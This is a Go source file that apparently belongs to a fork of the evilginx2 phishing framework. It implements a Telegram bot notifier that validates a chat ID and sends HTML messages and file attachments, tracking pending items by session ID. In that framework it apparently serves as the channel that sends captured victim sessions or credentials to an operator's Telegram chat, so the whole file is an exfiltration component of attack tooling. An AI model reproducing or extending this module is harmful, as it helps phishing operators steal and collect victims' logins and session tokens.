package core

import (
	"fmt"
	"strconv"
	"strings"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/kgretzky/evilginx2/log"
)

type Telegram struct {
    bot         *tgbotapi.BotAPI
    chatID      string
    enabled     bool
    lastMessage time.Time
    rateLimit   time.Duration
    pending     map[string]*tgbotapi.DocumentConfig // Map of session IDs to pending messages
}

func NewTelegram(botToken string, chatID string) (*Telegram, error) {
    if botToken == "" || chatID == "" {
        return &Telegram{enabled: false}, nil
    }

    bot, err := tgbotapi.NewBotAPI(botToken)
    if err != nil {
        return nil, err
    }

    // Create Telegram instance
    t := &Telegram{
        bot:       bot,
        chatID:    chatID,
        enabled:   true,
        rateLimit: 0 * time.Second,
        pending:   make(map[string]*tgbotapi.DocumentConfig),
    }

    // Validate chat ID immediately
    if err := t.validateChat(); err != nil {
        log.Warning("Telegram initialization warning: %v", err)
        log.Warning("Please ensure:")
        log.Warning("- For personal chat: you have started a conversation with the bot")
        log.Warning("- For group chat: the bot has been added to the group")
        log.Warning("- The chat ID is correct")
    }

    return t, nil
}

func (t *Telegram) validateChat() error {
    chatID, err := t.getChatID()
    if err != nil {
        return err
    }

    // For group chats (negative IDs), verify format
    if chatID < 0 {
        // Group IDs should be 13 digits for supergroups (-100 prefix)
        if len(t.chatID) < 13 || !strings.HasPrefix(t.chatID, "-100") {
            log.Warning("Group chat ID format may be incorrect - should start with '-100' and be 13 digits")
            log.Warning("Try adding -100 prefix to your group ID if not present")
            // Continue anyway to attempt the chat validation
        }
    }

    // Try to get chat information
    chat, err := t.bot.GetChat(tgbotapi.ChatInfoConfig{
        ChatConfig: tgbotapi.ChatConfig{
            ChatID: chatID,
        },
    })
    
    if err != nil {
        // Add more specific error messages
        if strings.Contains(err.Error(), "chat not found") {
            if chatID < 0 {
                return fmt.Errorf("group chat not found (ID: %v). Please ensure:\n"+
                    "1. The bot is added to the group\n"+
                    "2. The bot is an admin in the group\n"+
                    "3. The group ID starts with '-100' (e.g., -1001234567890)\n"+
                    "4. You can get the correct group ID by forwarding a message from the group to @RawDataBot", 
                    chatID)
            } else {
                return fmt.Errorf("personal chat not found (ID: %v). Please ensure:\n"+
                    "1. You have started a chat with the bot using /start\n"+
                    "2. The chat ID is correct (forward a message from the bot to @RawDataBot to verify)", 
                    chatID)
            }
        }
        return fmt.Errorf("failed to validate chat ID %v: %v", chatID, err)
    }

    // Log chat type for debugging
    chatType := "personal"
    if chat.Type == "group" || chat.Type == "supergroup" {
        chatType = "group"
    }
    log.Info("Successfully connected to Telegram %s chat: %s (ID: %v)", chatType, chat.Title, chatID)
    
    return nil
}

func (t *Telegram) SendMessage(message string) error {
    if !t.enabled {
        return nil
    }

    chatID, err := t.getChatID()
    if err != nil {
        return err
    }

    msg := tgbotapi.NewMessage(chatID, message)
    msg.ParseMode = "HTML"

    _, err = t.bot.Send(msg)
    if err != nil {
        log.Error("failed to send telegram message: %v", err)
        return err
    }
    return nil
}

func (t *Telegram) SendDocument(caption string, filename string, content []byte) error {
    if !t.enabled {
        return nil
    }

    // Rate limit check
    if time.Since(t.lastMessage) < t.rateLimit {
        return fmt.Errorf("rate limit exceeded")
    }

    chatID, err := t.getChatID()
    if err != nil {
        return err
    }

    fileBytes := tgbotapi.FileBytes{
        Name:  filename,
        Bytes: content,
    }

    doc := tgbotapi.NewDocument(chatID, fileBytes)
    doc.Caption = caption
    doc.ParseMode = "HTML"

    _, err = t.bot.Send(doc)
    if err != nil {
        log.Error("failed to send telegram document: %v", err)
        return err
    }
    
    t.lastMessage = time.Now()
    return nil
}

func (t *Telegram) getChatID() (int64, error) {
    // Remove any whitespace from the chat ID
    chatID := strings.TrimSpace(t.chatID)
    
    // Parse the chat ID as int64 to handle both positive (personal) and negative (group) IDs
    id, err := strconv.ParseInt(chatID, 10, 64)
    if err != nil {
        return 0, fmt.Errorf("invalid chat ID format: %v", err)
    }
    
    // Both personal chat IDs (positive) and group chat IDs (negative) are valid
    return id, nil
}
